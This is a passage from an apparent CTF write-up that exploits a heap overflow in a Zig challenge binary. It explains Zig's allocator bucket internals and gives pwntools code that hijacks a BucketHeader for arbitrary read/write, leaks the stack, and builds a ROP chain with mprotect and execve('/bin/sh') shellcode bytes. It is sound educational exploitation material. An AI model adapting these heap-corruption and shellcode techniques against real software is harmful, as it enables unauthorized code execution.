</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">large_allocations</span><span class="p">.</span><span class="n">ensureUnusedCapacity</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">rawAlloc</span><span class="p">(</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">,</span><span class="w"> </span><span class="n">len_align</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">gop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">large_allocations</span><span class="p">.</span><span class="n">getOrPutAssumeCapacity</span><span class="p">(</span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">slice</span><span class="p">.</span><span class="n">ptr</span><span class="p">));</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">retain_metadata</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="o">!</span><span class="n">config</span><span class="p">.</span><span class="n">never_unmap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="c1">// Backing allocator may be reusing memory that we&#39;re retaining metadata for
</span><span class="c1"></span><span class="w">            </span><span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">gop</span><span class="p">.</span><span class="n">found_existing</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">freed</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">gop</span><span class="p">.</span><span class="n">found_existing</span><span class="p">);</span><span class="w"> </span><span class="c1">// This would mean the kernel double-mapped pages.
</span><span class="c1"></span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">slice</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">enable_memory_limit</span><span class="p">)</span><span class="w">
</span><span class="w">            </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">requested_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">captureStackTrace</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">alloc</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">retain_metadata</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">freed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">never_unmap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">                </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">ptr_align</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">verbose_log</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#34;large alloc {d} bytes at {*}&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="w"> </span><span class="n">slice</span><span class="p">.</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">slice</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="p">});</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">slice</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">new_size_class</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">ceilPowerOfTwoAssert</span><span class="p">(</span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">new_aligned_size</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">allocSlot</span><span class="p">(</span><span class="n">new_size_class</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">verbose_log</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#34;small alloc {d} bytes at {*}&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">});</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="n">len</span><span class="p">];</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>First in <code>alloc</code>, if the aligned size is not larger than the largest bucket capacity (2**11) it will call <code>allocSlot</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">allocSlot</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">trace_addr</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">log2</span><span class="p">(</span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">first_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="n">orelse</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">createBucket</span><span class="p">(</span><span class="w">
</span><span class="w">        </span><span class="n">size_class</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="n">bucket_index</span><span class="p">,</span><span class="w">
</span><span class="w">    </span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">first_bucket</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">slot_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">divExact</span><span class="p">(</span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">slot_count</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">prev_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bucket</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">first_bucket</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="c1">// make a new one
</span><span class="c1"></span><span class="w">            </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">createBucket</span><span class="p">(</span><span class="n">size_class</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_index</span><span class="p">);</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">next</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="c1">// change the allocator&#39;s current bucket to be this one
</span><span class="c1"></span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">used_bits_byte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">usedBits</span><span class="p">(</span><span class="n">slot_index</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">used_bit_index</span>: <span class="nc">u3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intCast</span><span class="p">(</span><span class="n">u3</span><span class="p">,</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"> </span><span class="c1">// TODO cast should be unnecessary
</span><span class="c1"></span><span class="w">    </span><span class="n">used_bits_byte</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">(</span><span class="o">@</span><span class="k">as</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">used_bit_index</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">used_count</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">captureStackTrace</span><span class="p">(</span><span class="n">trace_addr</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span><span class="p">,</span><span class="w"> </span><span class="n">slot_index</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">alloc</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">size_class</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p><code>allocSlot</code> will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
<p>As you can see, the <code>BucketHeader</code> is structured like below in the <code>createBucket</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">createBucket</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_index</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!*</span><span class="n">BucketHeader</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">allocAdvanced</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">exact</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">errdefer</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">free</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucketSize</span><span class="p">(</span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">allocAdvanced</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">alignOf</span><span class="p">(</span><span class="n">BucketHeader</span><span class="p">),</span><span class="w"> </span><span class="n">bucket_size</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">exact</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">ptrCast</span><span class="p">(</span><span class="o">*</span><span class="n">BucketHeader</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_bytes</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">ptr</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BucketHeader</span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">.</span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">used_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
</span><span class="w">    </span><span class="p">};</span><span class="w">
</span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="c1">// Set the used bits to all zeroes
</span><span class="c1"></span><span class="w">    </span><span class="o">@</span><span class="n">memset</span><span class="p">(</span><span class="o">@</span><span class="k">as</span><span class="p">(</span><span class="o">*</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">.</span><span class="n">usedBits</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">usedBitsCount</span><span class="p">(</span><span class="n">size_class</span><span class="p">));</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>It allocates a page to store objects in, then it allocates the <code>BucketHeader</code> itself. Note that the page allocator will make allocations adjacent from each other. According to my several experiments the allocations grow &ndash; from an initial given mapping &ndash; to lower or higher addresses. I advice you to try different order of allocations in gdb to figure out this.</p>
<p>Let&rsquo;s quickly decribe each field of the <code>BucketHeader</code>:</p>
<ul>
<li><code>.prev</code> and <code>.next</code> keep track of the doubly linked list that links buckets of same size.</li>
<li><code>.page</code> contains the base address of the page that contains the objects that belong to the bucket.</li>
<li><code>alloc_cursor</code> contains the number of allocated objects.</li>
<li><code>used_count</code> contains the number of currently used objects.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="getting-read--write-what-were-primitive">
        Getting read / write what were primitive
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#getting-read--write-what-were-primitive" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting read / write what were primitive" href="#getting-read--write-what-were-primitive">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Well, the goal is to an arbitrary read / write by hiijacking the <code>.page</code> and <code>.alloc_cursor</code> fields of the <code>BucketHeader</code>, this way if we hiijack pointers from a currently used bucket for a given size we can get a chunk toward any location.</p>
<p>What we can do to get a chunk close to a  <code>BucketHeader</code> structure would be:</p>
<ul>
<li>Allocate large (<code>0x500-1</code>) chunk, <code>0x800</code> bucket.</li>
<li>Allocate 4 other chunks of size <code>1000</code>, which end up in the <code>0x400</code> bucket.</li>
</ul>
<p>Thus, first one page has been allocated to satisfy request one, then another page right after the other has been allocated to store the <code>BucketHeader</code> for this bucket.
Then, to satisfy the four next allocations, the page that stores the objects has been allocated right after the one which stores the <code>BucketHeader</code> of the <code>0x800</code>-bucket, and finally a page is allocated to store the <code>BucketHeader</code> of the <code>0x400</code> bucket.</p>
<p>If you do not understand clearly, I advice you to debug my exploit in <code>gdb</code> by looking at the <code>chunklist</code>.</p>
<p>With this process the last allocated <code>0x400</code>-sized chunk gets allocated <code>0x400</code> bytes before the <code>BucketHeader</code> of the bucket that handles <code>0x400</code>-sized chunks.
Thus to get a read / write what were we can simply trigger the heap overflow with the <code>edit</code> function to null out <code>.alloc_cursor</code> and <code>.used_count</code> and replace <code>.page</code> by the target location.
This way the next allocation that will request <code>0x400</code> bytes, which will trigger the hiijacked bucket and return the target location giving us the primitive.</p>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;vv&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="mh">0x400</span> \ <span class="c1"># padding</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> \ <span class="c1"># next / prev + .page point toward the target =&gt; 0x208000</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> \ <span class="c1"># .alloc_cursor &amp; .used_count</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># used bits</span>

<span class="c1"># next alloc(1000) will trigger the write what were</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="leak-stack">
        Leak stack
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#leak-stack" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak stack" href="#leak-stack">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can base used as a base compared with function&rsquo;s stackframes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1"># get chunk into target location (0x208000)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># argv is located at 0x208000 + 0x100</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="rop">
        ROP
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#rop" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROP" href="#rop">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
But the issue is that between the call to <code>SYS_read</code> within <code>std.fs.file.File.read</code> and the end of the function, variables that belong to the calling function&rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:</p>
<pre tabindex="0"><code>0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</code></pre><p>With the use of this gadget I&rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
The goal for the ROPchain is to <code>mptotect</code> a shellcode and then jump on it. The issue is that I didn&rsquo;t find a gadget to control the value of the <code>rdx</code> register but when it returns from <code>std.fs.file.File.read</code> it contains the value of size given to <code>edit</code>. So to call <code>mprotect(rdi=0x208000, rsi=0x1000, rdx=0x7)</code> we have to call <code>edit</code> with a size of <code>7</code> to write on the <code>std.fs.file.File.read</code> saved RIP the value of the magic gadget seen previously.</p>
<p>Here is the ROPchain:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="c1"># with the use of the write what were we write the shellcode at 0x208000</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>
<span class="c1"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x0000000000201fcf : pop rax ; syscall
</span><span class="s2">0x0000000000203147 : pop rdi ; ret
</span><span class="s2">0x000000000020351b : pop rsi ; ret
</span><span class="s2">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span class="s2">0x0000000000201e09 : ret
</span><span class="s2">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="c1"># write ROPchain into the safe area on the stack </span>
